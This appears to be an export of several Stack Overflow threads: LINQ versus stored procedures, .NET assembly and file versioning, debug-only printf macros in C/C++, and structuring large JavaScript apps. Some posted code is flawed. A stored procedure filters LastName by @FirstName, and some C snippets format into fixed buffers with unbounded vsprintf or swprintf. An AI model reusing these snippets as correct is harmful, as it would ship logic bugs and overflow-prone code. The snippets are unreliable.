 <p>The best code is no code, and with stored procedures you have to write at least some code in the database and code in the application to call it , whereas with LINQ to SQL or LINQ to Entities, you don't have to write any additional code beyond any other LINQ query aside from instantiating a context object. </p>
 <p>I am generally a proponent of putting everything in stored procedures, for all of the reasons DBAs have been harping on for years.  In the case of Linq, it is true that there will be no performance difference with simple CRUD queries.</p>

<p>But keep a few things in mind when making this decision: using any ORM couples you tightly to your data model.  A DBA has no freedom to make changes to the data model without forcing you to change your compiled code.  With stored procedures, you can hide these sorts of changes to an extent, since the parameter list and results set(s) returned from a procedure represent its contract, and the innards can be changed around, just so long as that contract is still met.</p>

<p>And also, if Linq is used for more complex queries, tuning the database becomes a much more difficult task.  When a stored procedure is running slow, the DBA can totally focus on the code in isolation, and has lots of options, just so that contract is still satisfied when he/she is done.</p>

<p>I have seen many, many cases where serious problems in an application were addressed by changes to the schema and code in stored procedures without any change to deployed, compiled code.</p>

<p>Perhaps a hybird approach would be nice with Linq?  Linq can, of course, be used to call stored procedures.</p>
 <p>For basic data retrieval I would be going for Linq without hesitation.</p>

<p>Since moving to Linq I've found the following advantages:</p>

<ol>
<li>Debugging my DAL has never been easier.</li>
<li>Compile time safety when your schema changes is priceless.</li>
<li>Deployment is easier because everything is compiled into DLL's. No more managing deployment scripts.</li>
<li>Because Linq can support querying anything that implements the IQueryable interface, you will be able to use the same syntax to query XML, Objects and any other datasource without having to learn a new syntax</li>
</ol>
 <blockquote>
  <p>A DBA has no freedom to make changes
  to the data model without forcing you
  to change your compiled code. With
  stored procedures, you can hide these
  sorts of changes to an extent, since
  the parameter list and results set(s)
  returned from a procedure represent
  its contract, and the innards can be
  changed around, just so long as that
  contract is still met.</p>
</blockquote>

<p>I really don't see this as being a benefit. Being able to change something in isolation might sound good in theory, but just because the changes fulfil a contract doesn't mean it's returning the correct results. To be able to determine what the correct results are you need context and you get that context from the calling code.</p>
 <p>Some advantages of LINQ over sprocs:</p>

<ol>
<li><strong>Type safety</strong>: I think we all understand this.</li>
<li><strong>Abstraction</strong>: This is especially true with <a href=""http://msdn.microsoft.com/en-us/library/bb386964.aspx"">LINQ-to-Entities</a>.  This abstraction also allows the framework to add additional improvements that you can easily take advantage of.  <a href=""http://msdn.microsoft.com/en-us/magazine/cc163329.aspx"">PLINQ</a> is an example of adding multi-threading support to LINQ.  Code changes are minimal to add this support.  It would be MUCH harder to do this data access code that simply calls sprocs.</li>
<li><strong>Debugging support</strong>: I can use any .NET debugger to debug the queries.  With sprocs, you cannot easily debug the SQL and that experience is largely tied to your database vendor (MS SQL Server provides a query analyzer, but often that isn't enough).</li>
<li><strong>Vendor agnostic</strong>: LINQ works with lots of databases and the number of supported databases will only increase.  Sprocs are not always portable between databases, either because of varying syntax or feature support (if the database supports sprocs at all).</li>
<li><strong>Deployment</strong>: Others have mentioned this already, but it's easier to deploy a single assembly than to deploy a set of sprocs.  This also ties in with #4.</li>
<li><strong>Easier</strong>: You don't have to learn T-SQL to do data access, nor do you have to learn the data access API (e.g. ADO.NET) necessary for calling the sprocs.  This is related to #3 and #4.</li>
</ol>

<p>Some disadvantages of LINQ vs sprocs:</p>

<ol>
<li><strong>Network traffic</strong>: sprocs need only serialize sproc-name and argument data over the wire while LINQ sends the entire query.  This can get really bad if the queries are very complex.  However, LINQ's abstraction allows Microsoft to improve this over time.</li>
<li><strong>Less flexible</strong>: Sprocs can take full advantage of a database's featureset.  LINQ tends to be more generic in it's support.  This is common in any kind of language abstraction (e.g. C# vs assembler).</li>
<li><strong>Recompiling</strong>: If you need to make changes to the way you do data access, you need to recompile, version, and redeploy your assembly.  Sprocs can <em>sometimes</em> allow a DBA to tune the data access routine without a need to redeploy anything.</li>
</ol>

<p>Security and manageability are something that people argue about too.</p>

<ol>
<li><strong>Security</strong>: For example, you can protect your sensitive data by restricting access to the tables directly, and put ACLs on the sprocs.  With LINQ, however, you can still restrict direct access  to tables and instead put ACLs on updatable table <em>views</em> to achieve a similar end (assuming your database supports updatable views).  </li>
<li><strong>Manageability</strong>: Using views also gives you the advantage of shielding your application non-breaking from schema changes (like table normalization).  You can update the view without requiring your data access code to change.</li>
</ol>

<p>I used to be a big sproc guy, but I'm starting to lean towards LINQ as a better alternative in general.  If there are some areas where sprocs are clearly better, then I'll probably still write a sproc but access it using LINQ. :)</p>
 <p>LINQ doesn't prohibit the use of stored procedures. I've used mixed mode with LINQ-SQL and <a href=""http://codebetter.com/blogs/david.hayden/archive/2008/02/19/linq-to-sql-and-stored-procedures-visual-studio-2008-and-repository-factory.aspx"">LINQ-storedproc</a>. Personally, I'm glad I don't have to write the stored procs....pwet-tu.</p>
 <p>LINQ will bloat the procedure cache</p>

<p>If an application is using LINQ to SQL and the queries involve the use of strings that can be highly variable in length, the SQL Server procedure cache will become bloated with one version of the query for every possible string length. For example, consider the following very simple queries created against the Person.AddressTypes table in the AdventureWorks2008 database:</p>

<pre><code>var p = 
    from n in x.AddressTypes 
    where n.Name == ""Billing"" 
    select n;

var p = 
    from n in x.AddressTypes 
    where n.Name == ""Main Office"" 
    select n;
</code></pre>

<p>If both of these queries are run, we will see two entries in the SQL Server procedure cache: One bound with an NVARCHAR(7), and the other with an NVARCHAR(11). Now imagine if there were hundreds or thousands of different input strings, all with different lengths. The procedure cache would become unnecessarily filled with all sorts of different plans for the exact same query. </p>

<p>More here: <a href=""https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=363290&amp;wa=wsignin1.0"" rel=""nofollow"">https://connect.microsoft.com/VisualStudio/feedback/ViewFeedback.aspx?FeedbackID=363290</a></p>
 <p><a href=""http://stackoverflow.com/questions/15142/what-are-the-pros-and-cons-to-keeping-sql-in-stored-procs-versus-code#15153"" rel=""nofollow"">Stored Procs vs Code</a> (Previous discussion)</p>
 <p>I think the pro LINQ argument seems to be coming from people who don't have a history with database development (in general).</p>

<p>Especially if using a product like VS DB Pro or Team Suite, many of the arguments made here do not apply, for instance:</p>

<p>Harder to maintain and Test:
VS provides full syntax checking, style checking, referential and constraint checking and more. It also provide full unit testing capabilities and refactoring tools.</p>

<p>LINQ makes true unit testing impossible as (in my mind) it fails the ACID test.</p>

<p>Debugging is easier in LINQ:
Why? VS allows full step-in from managed code and regular debugging of SPs.</p>

<p>Compiled into a single DLL rather than deployment scripts:
Once again, VS comes to the rescue where it can build and deploy full databases or make data-safe incremental changes.</p>

<p>Don't have to learn TSQL with LINQ:
No you don't, but you have to learn LINQ - where's the benefit?</p>

<blockquote>
  <p>I really don't see this as being a benefit. Being able to change something in isolation might sound good in theory, but just because the changes fulfil a contract doesn't mean it's returning the correct results. To be able to determine what the correct results are you need context and you get that context from the calling code.</p>
</blockquote>

<p>Um, loosely coupled apps are the ultimate goal of all good programmers as they really do increase flexibility. Being able to change things in isolation is fantastic, and it is your unit tests that will ensure it is still returning appropriate results.</p>

<p>Before you all get upset, I think LINQ has its place and has a grand future. But for complex, data-intensive applications I do not think it is ready to take the place of stored procedures. This was a view I had echoed by an MVP at TechEd this year (they will remain nameless).</p>

<p>EDIT: The LINQ to SQL Stored Procedure side of things is something I still need to read more on - depending on what I find I may alter my above diatribe ;)</p>
 <p>LINQ definitely has its place in application-specific databases and in small businesses.</p>

<p>But in a large enterprise, where central databases serve as a hub of common data for many applications, we need abstraction. We need to centrally manage security and show access histories. We need to be able to do impact analysis: if I make a small change to the data model to serve a new business need, what queries need to be changed and what applications need to be re-tested? Views and Stored Procedures give me that. If LINQ can do all that, and make our programmers more productive, I'll welcome it -- does anyone have experience using it in this kind of environment?</p>
 <p>Also there is the issue of possible 2.0 rollback. Trust me it has happened to me a couple times so I am sure it has happened to others.</p>

<p>I also agree that abstraction is best. Along with the fact the the original purpose of any ORM is to make RDBMS match up nicely to the OO concepts. However if everything worked fine before LINQ by having to deviate a bit from OO concepts then screw 'em. Concepts and reality don't always fit well together. There is no room for militant zealots in IT.</p>
 <p>LINQ is new and has its place. LINQ is not invented to replace stored procedure. </p>

<p>Here I will focus on some performance myths &amp; CONS, just for ""LINQ to SQL"", of course I might be totally wrong ;-)</p>

<p>(1)People say LINQ statment can ""cache"" in SQL server, so it doesn't lose performance. Partially true. ""LINQ to SQL"" actually is the runtime translating LINQ syntax to TSQL statment. So from the performance perspective,a hard coded ADO.NET SQL statement has no difference than LINQ. </p>

<p>(2)Given an example, a customer service UI has a ""account transfer"" function. this function itself might update 10 DB tables and return some messages in one shot. With LINQ, you have to build a set of statements and send them as one batch to SQL server. the performance of this translated LINQ->TSQL batch can hardly match stored procedure. Reason? because you can tweak the smallest unit of the statement in Stored procedue by using the built-in SQL profiler and execution plan tool, you can not do this in LINQ.</p>

<p>The point is, when talking single DB table and small set of data CRUD, LINQ is as fast as SP. But for much more complicated logic, stored procedure is more performance tweakable.</p>

<p>(3)""LINQ to SQL"" easily makes newbies to introduce performance hogs. Any senior TSQL guy can tell you when not to use CURSOR (Basically you should not use CURSOR in TSQL in most cases). With LINQ and the charming ""foreach"" loop with query, It's so easy for a newbie to write such code:</p>

<pre><code>foreach(Customer c in query)
{
  c.Country = ""Wonder Land"";
}
ctx.SubmitChanges();
</code></pre>

<p>You can see this easy decent code is so attractive. But under the hood, .NET runtime just translate this to an update batch. If there are only 500 lines, this is 500 line TSQL batch; If there are million lines, this is a hit. Of course, experienced user won't use this way to do this job, but the point is, it's so easy to fall in this way.</p>
 <p>IMHO, RAD = LINQ, RUP = Stored Procs.  I worked for a large Fortune 500 company for many years, at many levels including management, and frankly, I would never hire RUP developers to do RAD development.  They are so siloed that they very limited knowledge of what to do at other levels of the process.  With a siloed environment, it makes sense to give DBAs control over the data through very specific entry points, because others frankly don't know the best ways to accomplish data management.</p>

<p>But large enterprises move <em>painfully</em> slow in the development arena, and this is extremely costly. There are times when you need to move faster to save both time and money, and LINQ provides that and more in spades.</p>

<p>Sometimes I think that DBAs are biased against LINQ because they feel it threatens their job security.  But that's the nature of the beast, ladies and gentlemen.</p>
 <p>According to gurus, I define LINQ as motorcycle and SP as car.
If you want to go for a short trip and only have small passengers(in this case 2), go gracefully with LINQ.
But if you want to go for a journey and have large band, i think you should choose SP.</p>

<p>As a conclusion, choosing between motorcycle or car is depend on your route (business), length (time), and passengers (data).</p>

<p>Hope it helps, I may be wrong. :D</p>
 <p>Both LINQ and SQL have their places. Both have their disadvantages and advantages.</p>

<p>Sometimes for complex data retrieval you might need stored procs. And sometimes you may want other people to use your stored proc in Sql Server Management Studio.</p>

<p>Linq to Entities is great for fast CRUD development.</p>

<p>Sure you can build an app using only one or the other. Or you can mix it up. It all comes down to your requirements. But SQL stored procs will no go away any time soon.</p>
 <p>The outcome can be summarized as </p>

<p>LinqToSql for small sites, and prototypes. It really saves time for Prototyping.</p>

<p>Sps : Universal. I can fine tune my queries and always check ActualExecutionPlan / EstimatedExecutionPlan.</p>
 <pre><code>Create PROCEDURE userInfoProcedure
    -- Add the parameters for the stored procedure here
    @FirstName varchar,
    @LastName varchar
AS
BEGIN

    SET NOCOUNT ON;

    -- Insert statements for procedure here
    SELECT FirstName  , LastName,Age from UserInfo where FirstName=@FirstName
    and LastName=@FirstName
END
GO
</code></pre>

<p><a href=""http://www.totaldotnet.com/Article/ShowArticle121_StoreProcBasic.aspx"" rel=""nofollow"">http://www.totaldotnet.com/Article/ShowArticle121_StoreProcBasic.aspx</a></p>
 <p>I think you need to go with procs for anything real.</p>

<p>A) Writing all your logic in linq means your database is less useful because only your application can consume it.</p>

<p>B) I'm not convinced that object modelling is better than relational modelling anyway.</p>

<p>C) Testing and developing a stored procedure in SQL is a hell of a lot faster than a compile edit cycle in any Visual Studio environment.  You just edit, F5 and hit select and you are off to the races.</p>

<p>D) It's easier to manage and deploy stored procedures than assemblies.. you just put the file on the server, and press F5...</p>

<p>E) Linq to sql still writes crappy code at times when you don't expect it.</p>

<p>Honestly, I think the ultimate thing would be for MS to augment t-sql so that it can do a join projection impliclitly the way linq does.  t-sql should know if you wanted to do order.lineitems.part, for example.</p>
 <p>Store proc makes testing easier and you can change the query without touching the application code..Also with linq, getting a data doesnot mean its the right data..and testing the correctness of the data means running the application but with Store proc its easy to test without touching the application.</p>
 <p>For simple CRUD operations with a single data access point, I would say go for LINQ if you feel comfortable with the syntax. For more complicated logic I think sprocs are more efficiant performance-wise if you are good at T-SQL and its more advanced operations. You also have the help from Tuning Advisor, SQL Server Profiler, debugging your queries from SSMS etc. </p>
 <p>All these answers leaning towards LINQ are mainly talking about EASE of DEVELOPMENT which is more or less connected to poor quality of coding or laziness in coding. I am like that only. </p>

<p>Some advantages or Linq, I read here as , easy to test, easy to debug etc, but these are no where connected to Final output or end user. This is always going cause the trouble the end user on performance. Whats the point loading many things in memory and then applying filters on in using LINQ? </p>

<p>Again TypeSafety, is caution that ""we are careful to avoid wrong typecasting"" which again poor quality we are trying to improve by using linq. Even in that case, if anything in database changes, e.g. size of String column, then linq needs to be re-compiled and would not be typesafe without that .. I tried.</p>

<p>Although, we found is good, sweet, interesting etc while working with LINQ, it has shear disadvantage of making developer lazy :) and it is proved 1000 times that it is bad (may be worst) on performance compared to Stored Procs.</p>

<p>Stop being lazy. I am trying hard. :)</p>
"
"How best to use File Version and Assembly Version? <p>In .NET there are two version numbers available when building a project, File Version and Assembly Version. How are you using these numbers?  Keeping them the same?  Auto-incrementing one, but manually changing the other?</p>

<p>Also what about the <code>AssemblyInformationalVersion</code> attribute?</p>

<p>I'd found this support Microsoft Knowledge Base (KB) article that provided some help:  <a href=""http://support.microsoft.com/kb/556041"">How to use Assembly Version and Assembly File Version</a>.</p>
 <p>I keep them the same. But then, I don't have multifile assemblies, which is when the AssemblyVersion number becomes important. I use Microsoft-style date encoding for my build numbers, rather than auto-incrementing (I don't find the number of times that something has been built to be all that important).</p>
 <p>In a scenario where I have multiple file assemblies (i.e. 1 exe and 5 dlls) I will use a different file version for each, but the same assembly version for all of them, allowing you to know which exe each of the dlls go with.</p>
 <p>@Adam: Are you changing the file version with each build?  Are you using version control (SYN or VSS) and using that information to link source back to the binaries?</p>

<p>Seems to make sense that the Assembly version stays the same. i.e. ""2.0.0.0"".  That corresponds to the deployment of the product.</p>

<p>The file version changes to match the revision from the source control.  ""2.0.??.revision""  This would provide a link from a specific dll (or exe) to the source that built it.</p>
 <p>In solutions with multiple projects, one thing I've found very helpful is to have all the AssemblyInfo files point to a single project that governs the versioning. So my AssemblyInfos have a line:</p>

<pre><code>[assembly: AssemblyVersion(Foo.StaticVersion.Bar)]
</code></pre>

<p>I have a project with a single file that declares the string:</p>

<pre><code>namespace Foo
{
    public static class StaticVersion
    {
         public const string Bar= ""3.0.216.0""; // 08/01/2008 17:28:35
    }
}
</code></pre>

<p>My automated build process then just changes that string by pulling the most recent version from the database and incrementing the second last number.</p>

<p>I only change the Major build number when the featureset changes dramatically.</p>

<p>I don't change the file version at all.</p>
 <p>The KB article mentions the most important distinction: File versions are only used for display purposes, whereas the assembly version plays an important part in the .NET loading behaviour.</p>

<p>If you change the assembly version number, then the identity of your assembly as a whole has changed. Developers will need to rebuild to reference your new version (unless you put some auto-versioning ""policy"" in place) and at runtime only assemblies with matching version numbers will be loaded.</p>

<p>This is important in my environment, where we need an incrementing, highly visible version number for audit purposes, but we don't want to force developers to rebuild or have many versions concurrently in production. In this case for backwardly-compatible minor changes we update the file version, but not the assembly version.</p>
 <blockquote>
  <p>File versions are only used for display purposes, whereas the assembly version plays an important part in the .NET loading behaviour.</p>
</blockquote>

<p>Not quite.  The file version is also important for Windows Installer when you upgrade an existing version over a previous one.  </p>
 <p>With my current application, each VS project has a link to an ""AssemblyBuildInfo"" source file which has the following attributes:</p>

<pre><code>[assembly: AssemblyVersion(""1.0.*"")]
[assembly: AssemblyCompany(""Acme Corporationy"")]
[assembly: AssemblyCopyright(""Copyright ©  2009 Acme Corporation"")]
</code></pre>

<p>This way, all the assemblies in my solution share same version and company information (meaning if I have to change it, I change it only one time).  By excluding the FileVersion, it is automatically set to the AssemblyVersion.</p>
 <p>I wrote a blog post about this topic that may be useful to the community <a href=""http://blog.raffaeu.com/archive/2011/12/11/sharing-assembly-version-in-visual-studio-2010.aspx"" rel=""nofollow"">http://blog.raffaeu.com/archive/2011/12/11/sharing-assembly-version-in-visual-studio-2010.aspx</a> </p>
"
"How do you create a debug only function that takes a variable argument list? Like printf() <p>I'd like to make a debug logging function with the same parameters as <code>printf</code>.  But one that can be removed by the pre-processor during optimized builds.</p>

<p>For example:</p>

<pre><code>Debug_Print(""Warning: value %d &gt; 3!\n"", value);
</code></pre>

<p>I've looked at variadic macros but those aren't available on all platforms. <code>gcc</code> supports them, <code>msvc</code> does not.</p>
 <p>What platforms are they not available on? stdarg is part of the standard library:</p>

<p><a href=""http://www.opengroup.org/onlinepubs/009695399/basedefs/stdarg.h.html"" rel=""nofollow"">http://www.opengroup.org/onlinepubs/009695399/basedefs/stdarg.h.html</a></p>

<p>Any platform not providing it is not a standard C implementation (or very, very old). For those, you will have to use varargs:</p>

<p><a href=""http://opengroup.org/onlinepubs/007908775/xsh/varargs.h.html"" rel=""nofollow"">http://opengroup.org/onlinepubs/007908775/xsh/varargs.h.html</a></p>
 <p>Here's something that I do in C/C++. First off, you write a function that uses the varargs stuff (see the link in Stu's posting). Then do something like this:</p>

<pre><code>
 int debug_printf( const char *fmt, ... );
 #if defined( DEBUG )
  #define DEBUG_PRINTF(x) debug_printf x
 #else
   #define DEBUG_PRINTF(x)
 #endif

 DEBUG_PRINTF(( ""Format string that takes %s %s\n"", ""any number"", ""of args"" ));
</code></pre>

<p>All you have to remember is to use double-parens when calling the debug function, and the whole line will get removed in non-DEBUG code.</p>
 <p>I still do it the old way, by defining a macro (XTRACE, below) which correlates to either a no-op or a function call with a variable argument list. Internally, call vsnprintf so you can keep the printf syntax:</p>

<pre><code>#include &lt;stdio.h&gt;

void XTrace0(LPCTSTR lpszText)
{
   ::OutputDebugString(lpszText);
}

void XTrace(LPCTSTR lpszFormat, ...)
{
    va_list args;
    va_start(args, lpszFormat);
    int nBuf;
    TCHAR szBuffer[512]; // get rid of this hard-coded buffer
    nBuf = _vsnprintf(szBuffer, 511, lpszFormat, args);
    ::OutputDebugString(szBuffer);
    va_end(args);
}
</code></pre>

<p>Then a typical #ifdef switch:</p>

<pre><code>#ifdef _DEBUG
#define XTRACE XTrace
#else
#define XTRACE
#endif
</code></pre>

<p>Well that can be cleaned up quite a bit but it's the basic idea.</p>
 <p>Ah, vsprintf() was the thing I was missing.  I can use this to pass the variable argument list directly to printf():</p>

<pre><code>#include &lt;stdarg.h&gt;
#include &lt;stdio.h&gt;

void DBG_PrintImpl(char * format, ...)
{
    char buffer[256];
    va_list args;
    va_start(args, format);
    vsprintf(buffer, format, args);
    printf(""%s"", buffer);
    va_end(args);
}
</code></pre>

<p>Then wrap the whole thing in a macro.</p>
 <p>Another fun way to stub out variadic functions is:</p>

<pre><code>#define function sizeof
</code></pre>
 <p>In C++ you can use the streaming operator to simplify things:</p>

<pre><code>#if defined _DEBUG

class Trace
{
public:
   static Trace &amp;GetTrace () { static Trace trace; return trace; }
   Trace &amp;operator &lt;&lt; (int value) { /* output int */ return *this; }
   Trace &amp;operator &lt;&lt; (short value) { /* output short */ return *this; }
   Trace &amp;operator &lt;&lt; (Trace &amp;(*function)(Trace &amp;trace)) { return function (*this); }
   static Trace &amp;Endl (Trace &amp;trace) { /* write newline and flush output */ return trace; }
   // and so on
};

#define TRACE(message) Trace::GetTrace () &lt;&lt; message &lt;&lt; Trace::Endl

#else
#define TRACE(message)
#endif
</code></pre>

<p>and use it like:</p>

<pre><code>void Function (int param1, short param2)
{
   TRACE (""param1 = "" &lt;&lt; param1 &lt;&lt; "", param2 = "" &lt;&lt; param2);
}
</code></pre>

<p>You can then implement customised trace output for classes in much the same way you would do it for outputting to <code>std::cout</code>.</p>
 <p>Part of the problem with this kind of functionality is that often it requires
variadic macros.  These were standardized fairly recently(C99), and lots of
old C compilers do not support the standard, or have their own special work
around.</p>

<p>Below is a debug header I wrote that has several cool features:</p>

<ul>
<li>Supports C99 and C89 syntax for debug macros</li>
<li>Enable/Disable output based on function argument</li>
<li>Output to file descriptor(file io)</li>
</ul>

<p>Note: For some reason I had some slight code formatting problems.</p>

<pre><code>#ifndef _DEBUG_H_
#define _DEBUG_H_
#if HAVE_CONFIG_H
#include ""config.h""
#endif

#include ""stdarg.h""
#include ""stdio.h""

#define ENABLE 1
#define DISABLE 0

extern FILE* debug_fd;

int debug_file_init(char *file);
int debug_file_close(void);

#if HAVE_C99
#define PRINT(x, format, ...) \
if ( x ) { \
if ( debug_fd != NULL ) { \
fprintf(debug_fd, format, ##__VA_ARGS__); \
} \
else { \
fprintf(stdout, format, ##__VA_ARGS__); \
} \
}
#else
void PRINT(int enable, char *fmt, ...);
#endif

#if _DEBUG
#if HAVE_C99
#define DEBUG(x, format, ...) \
if ( x ) { \
if ( debug_fd != NULL ) { \
fprintf(debug_fd, ""%s : %d "" format, __FILE__, __LINE__, ##__VA_ARGS__); \
} \
else { \
fprintf(stderr, ""%s : %d "" format, __FILE__, __LINE__, ##__VA_ARGS__); \
} \
}

#define DEBUGPRINT(x, format, ...) \
if ( x ) { \
if ( debug_fd != NULL ) { \
fprintf(debug_fd, format, ##__VA_ARGS__); \
} \
else { \
fprintf(stderr, format, ##__VA_ARGS__); \
} \
}
#else /* HAVE_C99 */

void DEBUG(int enable, char *fmt, ...);
void DEBUGPRINT(int enable, char *fmt, ...);

#endif /* HAVE_C99 */
#else /* _DEBUG */
#define DEBUG(x, format, ...)
#define DEBUGPRINT(x, format, ...)
#endif /* _DEBUG */

#endif /* _DEBUG_H_ */
</code></pre>
 <p>@<a href=""#15269"" rel=""nofollow"">CodingTheWheel</a>:</p>

<p>There is one slight problem with your approach. Consider a call such as</p>

<pre><code>XTRACE(""x=%d"", x);
</code></pre>

<p>This works fine in the debug build, but in the release build it will expand to:</p>

<pre><code>(""x=%d"", x);
</code></pre>

<p>Which is perfectly legitimate C and will compile and usually run without side-effects but generates unnecessary code. The approach I usually use to eliminate that problem is:</p>

<ol>
<li><p>Make the XTrace function return an int (just return 0, the return value doesn't matter)</p></li>
<li><p>Change the #define in the #else clause to:</p>

<pre><code>0 &amp;&amp; XTrace
</code></pre></li>
</ol>

<p>Now the release version will expand to:</p>

<pre><code>0 &amp;&amp; XTrace(""x=%d"", x);
</code></pre>

<p>and any decent optimizer will throw away the whole thing since short-circuit evaluation would have prevented anything after the &amp;&amp; from ever being executed.</p>

<p>Of course, just as I wrote that last sentence, I realized that perhaps the original form might be optimized away too and in the case of side effects, such as function calls passed  as parameters to XTrace, it might be a better solution since it will make sure that debug and release versions will behave the same.</p>
 <p>This is how I do debug print outs in C++. Define 'dout' (debug out) like this:</p>

<pre><code>#ifdef DEBUG
#define dout cout
#else
#define dout 0 &amp;&amp; cout
#endif
</code></pre>

<p>In the code I use 'dout' just like 'cout'.</p>

<pre><code>dout &lt;&lt; ""in foobar with x= "" &lt;&lt; x &lt;&lt; "" and y= "" &lt;&lt; y &lt;&lt; '\n';
</code></pre>

<p>If the preprocessor replaces 'dout' with '0 &amp;&amp; cout' note that &lt;&lt; has higher precedence than &amp;&amp; and short-circuit evaluation of &amp;&amp; makes the whole line evaluate to 0. Since the 0 is not used the compiler generates no code at all for that line.</p>
 <p>Have a look at this thread:</p>

<ul>
<li><a href=""http://stackoverflow.com/questions/679979/"">How to make a variadic macro (variable number of arguments)</a></li>
</ul>

<p>It should answer your question.</p>
 <p>Having come across the problem today, my solution is the following macro:</p>

<pre><code>    static TCHAR __DEBUG_BUF[1024]
    #define DLog(fmt, ...)  swprintf(__DEBUG_BUF, fmt, ##__VA_ARGS__); OutputDebugString(__DEBUG_BUF) 
</code></pre>

<p>You can then call the function like this:</p>

<pre><code>    int value = 42;
    DLog(L""The answer is: %d\n"", value);
</code></pre>
 <p>This is what I use:</p>

<pre><code>inline void DPRINTF(int level, char *format, ...)
{
#    ifdef _DEBUG_LOG
        va_list args;
        va_start(args, format);
        if(debugPrint &amp; level) {
                vfprintf(stdout, format, args);
        }
        va_end(args);
#    endif /* _DEBUG_LOG */
}
</code></pre>

<p>which costs absolutely nothing at run-time when the _DEBUG_LOG flag is turned off.</p>
 <p>This is a TCHAR version of user's answer, so it will work as ASCII (<em>normal</em>), or Unicode mode (more or less).</p>

<pre><code>#define DEBUG_OUT( fmt, ...) DEBUG_OUT_TCHAR(       \
            TEXT(##fmt), ##__VA_ARGS__ )
#define DEBUG_OUT_TCHAR( fmt, ...)                  \
            Trace( TEXT(""[DEBUG]"") #fmt,            \
            ##__VA_ARGS__ )
void Trace(LPCTSTR format, ...)
{
    LPTSTR OutputBuf;
    OutputBuf = (LPTSTR)LocalAlloc(LMEM_ZEROINIT,   \
            (size_t)(4096 * sizeof(TCHAR)));
    va_list args;
    va_start(args, format);
    int nBuf;
    _vstprintf_s(OutputBuf, 4095, format, args);
    ::OutputDebugString(OutputBuf);
    va_end(args);
    LocalFree(OutputBuf); // tyvm @sam shaw
}
</code></pre>

<p><em>I say, ""more or less"", because it won't automatically convert ASCII string arguments to WCHAR, but it should get you out of most Unicode scrapes without having to worry about wrapping the format string in TEXT() or preceding it with L.</em></p>

<p>Largely derived from <a href=""https://msdn.microsoft.com/en-us/library/windows/desktop/ms680582(v=vs.85).aspx"" rel=""nofollow"">MSDN: Retrieving the Last-Error Code</a></p>
"
"Best practices for managing and deploying large JavaScript apps <p>What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.</p>

<p>Our JavaScript code is roughly ""namespaced"" as:</p>

<pre><code>var Client = {
   var1: '',
   var2: '',

   accounts: {
      /* 100's of functions and variables */
   },

   orders: {
      /* 100's of functions and variables and subsections */
   }

   /* etc, etc  for a couple hundred kb */
}
</code></pre>

<p>At the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes <em>forever</em> to find anything in the JavaScript code and the browser still has a dozen files to download.</p>

<p>Is it common to have a handful of ""source"" JavaScript files that gets ""compiled"" into one final, compressed JavaScript file? Any other handy hints or best practices?</p>
 <p>The approach that I've found works for me is having seperate JS files for each class (just as you would in Java, C# and others). Alternatively you can group your JS into application functional areas if that's easier for you to navigate.</p>

<p>If you put all your JS files into one directory, you can have your server-side environment (PHP for instance) loop through each file in that directory and output a <code>&lt;script src='/path/to/js/$file.js' type='text/javascript'&gt;</code> in some header file that is included by all your UI pages. You'll find this auto-loading especially handy if you're regularly creating and removing JS files.</p>

<p>When deploying to production, you should have a script that combines them all into one JS file and ""minifies"" it to keep the size down.</p>
 <p>For server efficiency's sake, it is best to combine all of your javascript into one minified file.</p>

<p>Determine the order in which code is required and then place the minified code in the order it is required in a single file.</p>

<p>The key is to reduce the number of requests required to load your page, which is why you should have all javascript in a single file for production.</p>

<p>I'd recommend keeping files split up for development and then create a build script to combine/compile everything.</p>

<p>Also, as a good rule of thumb, make sure you include your JavaScript toward the end of your page. If JavaScript is included in the header (or anywhere early in the page), it will stop all other requests from being made until it is loaded, even if pipelining is turned on. If it is at the end of the page, you won't have this problem.</p>
 <p>Just a sidenode - Steve already pointed out, you should really ""minify"" your JS files. In JS, whitespaces actually matter. If you have thousand lines of JS and you strip only the unrequired newlines you have already saved about 1K. I think you get the point.</p>

<p>There are tools, for this job. And you should never modify the ""minified""/stripped/obfuscated JS by hand! Never!</p>
 <p>There's an excellent article on Vitamin by Cal Henderson of Flickr fame on how they optimise delivery of their CSS and JavaScript: <a href=""http://www.iamcal.com/serving-javascript-fast/"" rel=""nofollow"">http://www.iamcal.com/serving-javascript-fast/</a></p>
 <p>In our big javascript applications, we write all our code in small separate files - one file per 'class' or functional group, using a kind-of-like-Java namespacing/directory structure. We then have:</p>

<ul>
<li>A compile-time step that takes all our code and minifies it (using a variant of JSMin) to reduce download size</li>
<li>A compile-time step that takes the classes that are always or almost always needed and concatenates them into a large bundle to reduce round trips to the server</li>
<li>A 'classloader' that loads the remaining classes at runtime on demand.</li>
</ul>
 <p>Read the code of other (good) javascript apps and see how they handle things.  But I start out with a file per class.  But once its ready for production, I would combine the files into one large file and minify.</p>

<p>The only reason, I would not combine the files, is if I didn't need all the files on all the pages.</p>
 <p>Also, I suggest you to use Google's <a href=""http://code.google.com/apis/ajaxlibs/documentation/"">AJAX Libraries API</a> in order to load external libraries. </p>

<p>It's a Google developer tool which bundle majors JavaScript libraries and make it easier to deploy, upgrade and make them lighter by always using compressed versions.</p>

<p>Also, it make your project simpler and lighter because you don't need to download, copy and maintain theses libraries files in your project.</p>

<p>Use it this way :</p>

<pre><code>google.load(""jquery"", ""1.2.3"");
google.load(""jqueryui"", ""1.5.2"");
google.load(""prototype"", ""1.6"");
google.load(""scriptaculous"", ""1.8.1"");
google.load(""mootools"", ""1.11"");
google.load(""dojo"", ""1.1.1"");
</code></pre>
 <p>My strategy consist of 2 major techniques: AMD modules (to avoid dozens of script tags) and the Module pattern (to avoid tightly coupling of the parts of your application)</p>

<p>AMD Modules: very straight forward, see here: <a href=""http://requirejs.org/docs/api.html"" rel=""nofollow"">http://requirejs.org/docs/api.html</a> also it's able to package all the parts of your app into one minified JS file: <a href=""http://requirejs.org/docs/optimization.html"" rel=""nofollow"">http://requirejs.org/docs/optimization.html</a></p>

<p>Module Pattern: i used this Library: <a href=""https://github.com/flosse/scaleApp"" rel=""nofollow"">https://github.com/flosse/scaleApp</a> you asking now what is this ? more infos here: <a href=""http://www.youtube.com/watch?v=7BGvy-S-Iag"" rel=""nofollow"">http://www.youtube.com/watch?v=7BGvy-S-Iag</a></p>
"
